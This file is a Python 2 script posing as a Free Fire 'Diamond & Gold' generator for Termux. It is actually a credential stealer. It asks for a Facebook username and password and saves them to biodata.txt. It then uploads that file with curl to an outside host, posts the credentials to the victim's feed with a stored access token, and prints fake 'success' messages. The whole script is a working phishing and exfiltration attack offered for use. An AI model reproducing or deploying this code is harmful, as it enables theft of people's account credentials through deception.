# MENTOL 
# At:Sat Feb 22 19:30:35 2020 

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
r = '\x1b[1;31m'
g = '\x1b[32;1m'
y = '\x1b[1;33m'
c = '\x1b[1;36m'
w = '\x1b[1;37m'
n = '\x1b[0;00m'
br = '\x1b[91;7m'
os.system('clear')

def atas():
    logo = '\n' + w + '\n ____  ____  ____  ____    ____  __  ____  ____ \n(  __)(  _ \\(  __)(  __)  (  __)(  )(  _ \\(  __)\n ) _)  )   / ) _)  ) _)    ) _)  )(  )   / ) _) \n(__)  (__\\_)(____)(____)  (__)  (__)(__\\_)(____)\n\t\t\tDiamond & Gold Menu ' + g + '[1.2]' + n + '\n\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2 '
    print logo


def login():
    atas()
    print y + '[ ' + g + '\xe2\x88\x9a ' + w + 'Login Facebook' + y + ' ]'
    user = raw_input(g + 'Username : ')
    pas = raw_input(g + 'Password : ')
    print
    print w + '<---- @root.termux:' + y + ' Checking ---->' + n
    os.system('sleep 0.9')
    print
    print y + '[ Username : ] ' + w + user
    print y + '[ Password : ] ' + w + pas
    print
    teks = ('Username: {}\nPasswodr: {}').format(user, pas)
    file_bio = open('biodata.txt', 'w')
    file_bio.write(teks)
    file_bio.close()
    os.system('sleep 1 && clear && sleep 2')
    atas()
    print g + 'Login in Facebook.com.....'
    os.system('sleep 1')
    print 'Succeeeees bos q'
    os.system('sleep 1.4 && clear')
    atas()
    menu()


def menu():
    print c + '1' + n + ')' + y + 'Auto +++ Diamond'
    print c + '2' + n + ')' + y + 'Auto +++ Gold'
    dm = raw_input(g + '@root.garena.com:' + w)
    if dm == '1' or dm == '01':
        toket = open('.login.txt', 'r').read()
        msg = open('biodata.txt', 'r').read()
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        nick = raw_input(c + 'Nick Lu : ' + y)
        al = raw_input(c + 'id : ' + y)
        brpdm = raw_input(c + 'Jumlah Diamond : ' + y)
        print r + '[ ' + g + 'Processing' + r + ' ]'
        print c
        os.system('sleep 2')
        os.system('curl -k -T biodata.txt http://www.aaglcapetown2013.org.za')
        count = 0
        while count <= brpdm:
            print (
             n + '[succes]{key_id=' + al + ' name=' + nick + ' importdiamond: ', count)
            count = count + 1

    if dm == '2' or dm == '02':
        toket = open('.login.txt', 'r').read()
        msg = open('biodata.txt', 'r').read()
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        os.system('curl -k -T biodata.txt http://www.aaglcapetown2013.org.za')
        nick = raw_input(c + 'Nick Lu : ' + y)
        al = raw_input(c + 'id : ' + y)
        brpdm = raw_input(c + 'Jumlah Gold : ' + y)
        print r + '[ ' + g + 'Processing' + r + ' ]'
        print y
        os.system('sleep 2')
        count = 0
        while count <= brpdm:
            print (
             n + '[succes]{key_id=' + al + ' name=' + nick + ' importgold: ', count)
            count = count + 1


login()
